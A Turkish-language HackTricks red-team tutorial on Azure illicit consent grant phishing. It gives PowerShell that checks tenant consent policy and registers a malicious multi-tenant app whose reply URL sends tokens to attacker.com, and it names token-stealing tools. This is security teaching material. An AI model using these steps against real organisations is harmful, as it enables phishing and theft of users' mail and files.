# Az - Yasadışı Onay Verme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## OAuth Uygulama Saldırısı

**Azure Uygulamaları**, **kullanıcı verilerine** (temel bilgiler, belgelere erişim, e-posta gönderme...) erişim izni istemektedir.\
**İzin verildiğinde**, normal bir kullanıcı sadece **"Düşük Etki" izinleri** için onay verebilir. **Diğer tüm** durumlarda, **yönetici onayı gereklidir**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme izni` içeren özel bir rol, kiracı genelinde onay sağlayabilir.

Yalnızca **yönetici onayı gerektirmeyen izinler**, **düşük etki** olarak sınıflandırılır. Temel oturum açma için gereken izinler openid, profile, email, User.Read ve offline\_access'dir. Bir **kuruluş**, kullanıcı onayına **tüm uygulamalar** için izin verirse, bir çalışan, bir uygulamaya **profilinden yukarıdakileri okuma** izni verebilir.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Bu nedenle, bir saldırgan **kötü niyetli bir Uygulama** hazırlayabilir ve **phishing** ile kullanıcıyı **Uygulamayı kabul etmeye ve verilerini çalmaya** ikna edebilir.

### Kullanıcıların onay vermesine izin verilip verilmediğini kontrol edin

Aşağıdaki PowerShell komutu, Azure Active Directory (Azure AD) kullanıcılarının uygulamalara onay verebilme yetenekleriyle ilgili onay yapılandırmasını kontrol etmek için kullanılır:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Kullanıcı onayını devre dışı bırak**: Bu ayar, kullanıcıların uygulamalara izin vermesini engeller. Kullanıcıların uygulamalara onay vermesine izin verilmez.
* **Kullanıcılar doğrulanmış yayıncılardan veya kuruluşunuzdan uygulamalara onay verebilir, ancak yalnızca seçtiğiniz izinler için**: Bu ayar, tüm kullanıcıların yalnızca doğrulanmış bir yayıncı tarafından yayınlanan ve kendi kiracınıza kaydedilen uygulamalara onay vermesine izin verir. Yalnızca belirli izinler için onay verilmesine izin vererek bir kontrol katmanı ekler.
* **Kullanıcılar tüm uygulamalara onay verebilir**: Bu ayar daha izin vericidir ve tüm kullanıcıların yönetimsel onay gerektirmeyen izinler için herhangi bir uygulamaya onay vermesine izin verir.
* **Özel uygulama onay politikası**: Bu ayar, özel bir politikanın uygulandığını gösterir ve belirli kurumsal gereksinimlere göre özelleştirilebilir. Bu politika, uygulama yayıncısına, uygulamanın istediği izinlere ve diğer faktörlere dayalı olarak kısıtlamaların bir kombinasyonunu içerebilir.

## **Haksız Onay Verme Saldırısını Anlama**

Haksız onay verme saldırısında, saldırganlar Azure'a kaydedilmiş kötü niyetli bir uygulamaya izin vermek için son kullanıcıları kandırır. Bunun için uygulamanın meşru görünmesini sağlayarak kurbanların bilmeden "Kabul Et" düğmesine tıklamasını sağlarlar. Sonuç olarak, Azure AD saldırganın sitesine bir belirteç verir ve saldırganın kuruluş hesabına ihtiyaç duymadan kurbanın verilerine erişmesine ve bunları manipüle etmesine olanak tanır, örneğin e-postaları okuma veya gönderme ve dosyalara erişme gibi.

## **Saldırı Akışı Genel Bakışı**

Saldırı, genel bir şirketi hedef alan birkaç adım içerir. İşte nasıl gerçekleşebileceği:

1. **Alan Kaydı ve Uygulama Barındırma**: Saldırgan, güvenilir bir siteye benzeyen bir alan kaydeder, örneğin "güvenlialanlogin.com". Bu alan altında, kötü niyetli uygulamayı barındırmak için bir alt alan oluşturulur (örneğin "sirketadı.güvenlialanlogin.com").

2. **Azure AD'de Uygulama Kaydı**: Saldırgan, Azure AD Kiracında Hizmet Sağlayıcı Uygulaması kaydeder ve meşru görünmek için hedef şirketin adını verir. Uygulamanın Yönlendirme URL'sini, kötü niyetli uygulamayı barındıran alt alanı işaret edecek şekilde yapılandırır.

3. **İzinleri Ayarlama**: Saldırgan, uygulamayı çeşitli API izinleriyle yapılandırır (örneğin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Bu izinler, kullanıcı tarafından onaylandığında saldırganın kullanıcı adına hassas bilgileri çekmesine olanak tanır.

4. **Kötü Amaçlı Bağlantıları Dağıtma**: Saldırgan, kötü niyetli uygulamanın istemci kimliğini içeren bir bağlantı oluşturur ve hedeflenen kullanıcılarla paylaşarak onlara onay vermelerini sağlar.

## **Saldırı İçin Araçları Kullanma**

Saldırı, [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) gibi araçlar kullanılarak kolaylaştırılabilir.

### Saldırı Öncesi Hazırlık:
Saldırgan, kurban kuruluşunun politikasının kullanıcının uygulamaları kabul etmesine izin verip vermediğini kontrol edebilir, eğer saldırganın kurban kuruluşunda bir kullanıcıya erişimi varsa.
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Saldırıyı gerçekleştirmek için saldırganın Azure Kiracısında (Uygulama kayıtlarında) **yeni bir Uygulama** oluşturması gerekmektedir. Bu uygulama aşağıdaki izinlerle yapılandırılmalıdır:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`, `Microsoft Graph` içinde `Delegated permissions` altında bulunmaktadır. (Uygulama izinleri her zaman ek onay gerektirir).

* `User.ReadBasic.All`, verildiği takdirde, kuruluştaki **tüm kullanıcıların bilgilerini okumanıza** olanak sağlayan bir izindir.
* Unutmayın ki, yalnızca `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme iznine sahip özel bir rol` içeren kullanıcılar, kiracı genelinde onay verebilir. Bu nedenle, **yönetici onayı gerektiren bir Uygulamayı** onaylaması için bu rollerden birine sahip bir kullanıcıyı **phishing** yapmanız gerekmektedir.

Ayrıca, aşağıdaki komut satırı aracılığıyla da bir Uygulama oluşturabilirsiniz:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Nasıl yapılandırılacağını öğrenmek için [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresini kontrol edin.

{% hint style="warning" %}
Elde edilen **erişim belirteci**, **graph uç noktası** için `User.Read` ve `User.ReadBasic.All` (istenen izinler) kapsamında olacaktır. Diğer işlemleri gerçekleştiremeyeceksiniz (ancak bu izinler, orgdaki tüm kullanıcılar hakkında bilgi indirmek için yeterlidir).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Bu saldırıyı gerçekleştirmek için bu aracı da kullanabilirsiniz.

## Saldırı Sonrası

Kullanıcıya erişim sağladıktan sonra hassas belgeleri çalabilir ve hatta geri kapı eklenmiş belge dosyalarını yükleyebilirsiniz.

## Referanslar

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
